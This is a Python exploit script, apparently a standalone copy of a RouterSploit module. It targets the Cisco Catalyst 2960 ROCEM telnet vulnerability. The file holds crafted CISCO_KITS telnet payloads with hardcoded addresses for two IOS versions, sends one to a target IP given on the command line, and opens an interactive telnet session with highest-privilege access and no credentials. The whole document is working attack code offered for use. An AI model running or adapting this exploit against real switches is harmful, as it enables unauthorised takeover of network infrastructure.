target = ""
# rsf exploit module
# description: Module exploits Cisco Catalyst 2960 ROCEM RCE vulnerability which allows patching execution flow to allow credless telnet interaction with highest privilege level.

import socket
import telnetlib
import random
import string

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 23
        self.action = "set"
        self.device = -1
        
        self.payloads = [
            # Cisco Catalyst 2960 IOS 12.2(55)SE1
            {
                "template": (
                    b"\xff\xfa\x24\x00" +
                    b"\x03CISCO_KITS\x012:" +
                    b"A" * 116 +
                    b"\x00\x00\x37\xb4" +
                    b"\x02\x2c\x8b\x74" +
                    b"{FUNC_IS_CLUSTER_MODE}" +
                    b"BBBB" +
                    b"\x00\xdf\xfb\xe8" +
                    b"CCCC" +
                    b"DDDD" +
                    b"EEEE" +
                    b"\x00\x06\x78\x8c" +
                    b"\x02\x2c\x8b\x60" +
                    b"FFFF" +
                    b"GGGG" +
                    b"\x00\x6b\xa1\x28" +
                    b"{FUNC_PRIVILEGE_LEVEL}" +
                    b"HHHH" +
                    b"IIII" +
                    b"\x01\x48\xe5\x60" +
                    b"JJJJ" +
                    b"KKKK" +
                    b"LLLL" +
                    b"\x01\x13\x31\xa8" +
                    b":15:" + b"\xff\xf0"
                ),
                "func_is_cluster_mode": {
                    "set": b"\x00\x00\x99\x80",
                    "unset": b"\x00\x04\xea\x58"
                },
                "func_privilege_level": {
                    "set": b"\x00\x12\x52\x1c",
                    "unset": b"\x00\x04\xe6\xf0"
                }
            },
            # Cisco Catalyst 2960 IOS 12.2(55)SE11
            {
                "template": (
                    b"\xff\xfa\x24\x00" +
                    b"\x03CISCO_KITS\x012:" +
                    b"A" * 116 +
                    b"\x00\x00\x37\xb4" +
                    b"\x02\x3d\x55\xdc" +
                    b"{FUNC_IS_CLUSTER_MODE}" +
                    b"BBBB" +
                    b"\x00\xe1\xa9\xf4" +
                    b"CCCC" +
                    b"DDDD" +
                    b"EEEE" +
                    b"\x00\x06\x7b\x5c" +
                    b"\x02\x3d\x55\xc8" +
                    b"FFFF" +
                    b"GGGG" +
                    b"\x00\x6c\xb3\xa0" +
                    b"{FUNC_PRIVILEGE_LEVEL}" +
                    b"HHHH" +
                    b"IIII" +
                    b"\x01\x4a\xcf\x98" +
                    b"JJJJ" +
                    b"KKKK" +
                    b"LLLL" +
                    b"\x01\x14\xe7\xec" +
                    b":15:" + b"\xff\xf0"
                ),
                "func_is_cluster_mode": {
                    "set": b"\x00\x00\x99\x9c",
                    "unset": b"\x00\x04\xeA\xe0"
                },
                "func_privilege_level": {
                    "set": b"\x00\x27\x0b\x94",
                    "unset": b"\x00\x04\xe7\x78"
                }
            }
        ]

    def random_text(self, n):
        return ''.join(random.choice(string.ascii_letters) for _ in range(n))

    def run(self):
        if self.device < 0 or self.device >= len(self.payloads):
            print("[-] Set target device")
            return

        if self.action not in ["set", "unset"]:
            print("[-] Specify action: set / unset credless authentication for Telnet service")
            return

        print("[*] Trying to connect to Telnet service")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target, self.port))
            response = sock.recv(1024)
            print("[+] Connection OK")
            
            print("[*] Building payload...")
            payload = self.build_payload()
            
            print("[*] Sending payload")
            sock.send(payload)
            sock.close()
            
            if self.action == "set":
                print("[*] Connecting to Telnet service...")
                tn = telnetlib.Telnet(self.target, self.port)
                tn.interact()
        except Exception as e:
            print(f"[-] Error: {str(e)}")

    def build_payload(self):
        payload = self.payloads[self.device]['template']
        payload = payload.replace(b"{FUNC_IS_CLUSTER_MODE}", self.payloads[self.device]['func_is_cluster_mode'][self.action])
        payload = payload.replace(b"{FUNC_PRIVILEGE_LEVEL}", self.payloads[self.device]['func_privilege_level'][self.action])
        return payload

    def check(self):
        return None



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
